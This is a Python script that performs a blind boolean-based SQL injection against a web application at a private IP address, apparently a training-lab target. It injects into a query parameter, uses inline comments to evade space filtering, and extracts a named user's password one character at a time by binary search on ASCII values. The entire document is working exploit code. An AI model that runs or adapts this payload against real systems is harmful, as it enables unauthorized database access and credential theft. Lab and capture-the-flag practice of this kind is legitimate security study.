#!/usr/bin/python3

import requests
import sys

# The target email
target_email = "Amy.Mcwilliams@proton.me"

# Proxy settings
proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Custom headers
headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
}

# Checks if query `q` evaluates as `true` or `false`
def oracle(q):
    # Construct the payload with the `/**/` characters included
    p = f"{target_email}' AND id=({q})-- -"
    r = requests.get(
        f"http://10.129.204.249:8080/?q={p}", proxies=proxy, headers=headers)
    # Return true if the status code is 200
    return r.status_code == 200

# Get the target's password length
length = 36
# Loop until the value of `length` matches `LENGTH(password)`
# while not oracle(f"LENGTH(password)={length} AND email='{target_email}'"):
#     length += 1
print(f"[*] Password length = {length}")

# Dump the target's password (Bisection)
print("[*] Password = ", end='')
for i in range(1, length + 1):
    low = 0
    high = 127
    while low <= high:
        mid = (low + high) // 2
        if oracle(f"SELECT/**/ASCII(SUBSTRING(password,{i},1))/**/FROM/**/users/**/WHERE/**/email='{target_email}'/**/AND/**/ASCII(SUBSTRING(password,{i},1))/**/BETWEEN/**/{low}/**/AND/**/{mid}"):
            high = mid - 1
        else:
            low = mid + 1
    print(chr(low), end='')
    sys.stdout.flush()
print()
